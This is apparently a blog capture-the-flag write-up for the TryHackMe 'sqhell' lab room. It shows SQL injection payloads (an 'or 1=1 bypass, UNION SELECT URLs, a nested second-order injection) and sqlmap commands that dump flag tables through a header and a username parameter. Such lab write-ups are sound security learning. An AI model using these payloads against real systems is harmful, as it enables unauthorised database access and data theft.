@@ -1,0 +1,276 @@
+<!DOCTYPE html>
+<html lang="en">
+
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="Content-Language" content="en">
+    <meta name="color-scheme" content="light dark">
+
+    
+
+    <meta name="author" content="monoloc0">
+    <meta name="description" content="https://tryhackme.com/room/sqhell
+Flag 1     pre code { background-color: #eee; }  Payload
+&#39;or 1=1 -- Nice, we found flag 1
+Flag 2    According to the Hint: Make sure to read the terms and conditions ;)
+it must have something to do with the X-Forwarded-for header
+So, I started to following sqlmap command
+sqlmap --dbms mysql --headers=&quot;X-forwarded-for:1*&quot; -u http://sqhell.thm and saw, that it is very likely vulnerable.">
+    <meta name="keywords" content="infosec,bugbounty,personal">
+
+    <meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="sqhell"/>
+<meta name="twitter:description" content="https://tryhackme.com/room/sqhell
+Flag 1     pre code { background-color: #eee; }  Payload
+&#39;or 1=1 -- Nice, we found flag 1
+Flag 2    According to the Hint: Make sure to read the terms and conditions ;)
+it must have something to do with the X-Forwarded-for header
+So, I started to following sqlmap command
+sqlmap --dbms mysql --headers=&quot;X-forwarded-for:1*&quot; -u http://sqhell.thm and saw, that it is very likely vulnerable."/>
+
+    <meta property="og:title" content="sqhell" />
+<meta property="og:description" content="https://tryhackme.com/room/sqhell
+Flag 1     pre code { background-color: #eee; }  Payload
+&#39;or 1=1 -- Nice, we found flag 1
+Flag 2    According to the Hint: Make sure to read the terms and conditions ;)
+it must have something to do with the X-Forwarded-for header
+So, I started to following sqlmap command
+sqlmap --dbms mysql --headers=&quot;X-forwarded-for:1*&quot; -u http://sqhell.thm and saw, that it is very likely vulnerable." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://www.monoloco.org/sqhell/" /><meta property="article:section" content="" />
+
+
+
+
+
+    <title>
+  sqhell · monoloc0
+</title>
+
+    
+      <link rel="canonical" href="https://www.monoloco.org/sqhell/">
+    
+
+    <link rel="preload" href="https://www.monoloco.org/fonts/forkawesome-webfont.woff2?v=1.2.0" as="font" type="font/woff2" crossorigin>
+
+    
+      
+      
+      <link rel="stylesheet" href="https://www.monoloco.org/css/coder.min.843ee18d510f7cb1bb49110db117b99ea65489c095d620a5d79ea71693478e77.css" integrity="sha256-hD7hjVEPfLG7SRENsRe5nqZUicCV1iCl156nFpNHjnc=" crossorigin="anonymous" media="screen" />
+    
+
+    
+
+    
+
+    
+
+    
+
+    <link rel="icon" type="image/png" href="https://www.monoloco.org/images/favicon-32x32.png" sizes="32x32">
+    <link rel="icon" type="image/png" href="https://www.monoloco.org/images/favicon-16x16.png" sizes="16x16">
+
+    <link rel="apple-touch-icon" href="https://www.monoloco.org/images/apple-touch-icon.png">
+    <link rel="apple-touch-icon" sizes="180x180" href="https://www.monoloco.org/images/apple-touch-icon.png">
+
+    <meta name="generator" content="Hugo 0.89.4" />
+  </head>
+
+  
+  
+  <body class="preload-transitions colorscheme-light">
+    
+
+    <main class="wrapper">
+      <nav class="navigation">
+  <section class="container">
+    <a class="navigation-title" href="https://www.monoloco.org/">
+      monoloc0
+    </a>
+    
+      <input type="checkbox" id="menu-toggle" />
+      <label class="menu-button float-right" for="menu-toggle">
+        <i class="fa fa-bars fa-fw" aria-hidden="true"></i>
+      </label>
+      <ul class="navigation-list">
+        
+          
+            <li class="navigation-item">
+              <a class="navigation-link" href="https://www.monoloco.org/whoami/">whoami</a>
+            </li>
+          
+            <li class="navigation-item">
+              <a class="navigation-link" href="https://www.monoloco.org/writeups/">writeups</a>
+            </li>
+          
+            <li class="navigation-item">
+              <a class="navigation-link" href="https://www.monoloco.org/resources/">resources</a>
+            </li>
+          
+        
+        
+      </ul>
+    
+  </section>
+</nav>
+
+
+      <div class="content">
+        
+  <section class="container page">
+  <article>
+    <header>
+      <h1 class="title">
+        <a class="title-link" href="https://www.monoloco.org/sqhell/">
+          sqhell
+        </a>
+      </h1>
+    </header>
+
+    <p><em><a href="https://tryhackme.com/room/sqhell">https://tryhackme.com/room/sqhell</a></em></p>
+<h1 id="flag-1">
+  Flag 1
+  <a class="heading-link" href="#flag-1">
+    <i class="fa fa-link" aria-hidden="true"></i>
+  </a>
+</h1>
+<style>
+
+
+pre code {
+  background-color: #eee;
+
+}
+
+
+</style>
+
+<p><strong>Payload</strong></p>
+<pre tabindex="0"><code>'or 1=1 -- 
+</code></pre><p><img src="https://www.monoloco.org/images/20210522102354.png" alt="20210522102354.png"></p>
+<p>Nice, we found flag 1</p>
+<p><img src="https://www.monoloco.org/images/20210522102223.png" alt="20210522102223.png"></p>
+<h1 id="flag-2">
+  Flag 2
+  <a class="heading-link" href="#flag-2">
+    <i class="fa fa-link" aria-hidden="true"></i>
+  </a>
+</h1>
+<p>According to the Hint:
+<em>Make sure to read the terms and conditions ;)</em></p>
+<p>it must have something to do with the <strong>X-Forwarded-for header</strong></p>
+<p>So, I started to following sqlmap command</p>
+<pre tabindex="0"><code>sqlmap --dbms mysql --headers=&quot;X-forwarded-for:1*&quot; -u http://sqhell.thm 
+</code></pre><p>and saw, that it is very likely vulnerable.</p>
+<p><img src="https://www.monoloco.org/images/20210523131209.png" alt="20210523131209.png"></p>
+<p>Next up, I ran the following command:</p>
+<pre tabindex="0"><code>sqlmap --dbms mysql --headers=&quot;X-forwarded-for:1*&quot; -u http://sqhell.thm --dump -T flag
+</code></pre><p>Awesome, we&rsquo;ve found flag 2 ;)</p>
+<p><img src="https://www.monoloco.org/images/20210523131327.png" alt="20210523131327.png"></p>
+<h1 id="flag-3">
+  Flag 3
+  <a class="heading-link" href="#flag-3">
+    <i class="fa fa-link" aria-hidden="true"></i>
+  </a>
+</h1>
+<p>The following Request seems to be vulnerable:</p>
+<pre tabindex="0"><code>GET /register/user-check?username=admin HTTP/1.1
+Host: sqhell.thm
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
+Accept: application/json, text/javascript, */*; q=0.01
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://sqhell.thm/register
+X-Requested-With: XMLHttpRequest
+Connection: close
+</code></pre><p><strong>Sqlmap</strong></p>
+<ul>
+<li>see if Sqlmap finds something</li>
+</ul>
+<pre tabindex="0"><code>sqlmap -r request-check-user.txt -p username --level=5 --risk=3
+</code></pre><p><img src="https://www.monoloco.org/images/20210522221107.png" alt="20210522221107.png"></p>
+<ul>
+<li>looks promising. Let&rsquo;s try to dump the databases</li>
+</ul>
+<pre tabindex="0"><code>sqlmap -r request-check-user.txt -p username --dump -T flag
+</code></pre><p>Cool, we found flag 3</p>
+<p><img src="https://www.monoloco.org/images/20210522221924.png" alt="20210522221924.png"></p>
+<h1 id="flag-4">
+  Flag 4
+  <a class="heading-link" href="#flag-4">
+    <i class="fa fa-link" aria-hidden="true"></i>
+  </a>
+</h1>
+<p>Hint: <em>Well, dreams, they feel real while we&rsquo;re in them right?</em></p>
+<p>Explanation: When accessing <a href="http://sqhell.thm/users?id=1">http://sqhell.thm/users?id=1</a> the posts from this user are displayed. This indicates, that another query is made (based on the user id) that fetches the posts from this user.</p>
+<p><img src="https://www.monoloco.org/images/20210524180943.png" alt="20210524180943.png"></p>
+<p>So, let&rsquo;s try to inject code into this &ldquo;second&rdquo; query.</p>
+<p>As you can see on the following screenshot, the second value is displayed on the webpage.
+<img src="https://www.monoloco.org/images/20210524181451.png" alt="20210524181451.png"></p>
+<p>That means, this value must be replaced with the flag.</p>
+<p>Payload:</p>
+<pre tabindex="0"><code>http://sqhell.thm/user?id=2%20UNION%20SELECT%20%221%20UNION%20SELECT%201,flag,3,4%20from%20flag--%20%22,NULL,NULL%20FROM%20users%20--
+</code></pre><p>There you go,&hellip;</p>
+<p><img src="https://www.monoloco.org/images/20210524180810.png" alt="20210524180810.png"></p>
+<h1 id="flag-5">
+  Flag 5
+  <a class="heading-link" href="#flag-5">
+    <i class="fa fa-link" aria-hidden="true"></i>
+  </a>
+</h1>
+<p><strong>Find out number of columns using &lsquo;order by&rsquo;</strong></p>
+<pre tabindex="0"><code>http://sqhell.thm/post?id=1 order by 5
+</code></pre><p><img src="https://www.monoloco.org/images/20210522102722.png" alt="20210522102722.png"></p>
+<p><img src="https://www.monoloco.org/images/20210522102748.png" alt="20210522102748.png"></p>
+<p><strong>Version Extraction</strong></p>
+<pre tabindex="0"><code>http://sqhell.thm/post?id=3%20UNION%20SELECT%201,version()%20,NULL,NULL%20from%20sqhell_5.posts
+</code></pre><p><img src="https://www.monoloco.org/images/20210522105300.png" alt="20210522105300.png"></p>
+<p>On the picture down below you can see that we found the last flag :)</p>
+<pre tabindex="0"><code>http://sqhell.thm/post?id=3%20UNION%20SELECT%201,flag%20,NULL,NULL%20from%20sqhell_5.flag
+</code></pre><p><img src="https://www.monoloco.org/images/20210522110641.png" alt="20210522110641.png"></p>
+
+  </article>
+</section>
+
+  
+
+      </div>
+
+      <footer class="footer">
+  <section class="container">
+    ©
+    
+    2022
+     monoloc0 
+
+
+    
+  </section>
+</footer>
+
+    </main>
+
+    
+      
+      <script src="https://www.monoloco.org/js/coder.min.03b17769f4f91ae35667e1f2a1ca8c16f50562576cf90ff32b3179926914daa5.js" integrity="sha256-A7F3afT5GuNWZ&#43;HyocqMFvUFYlds&#43;Q/zKzF5kmkU2qU="></script>
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+  </body>
+
+</html>
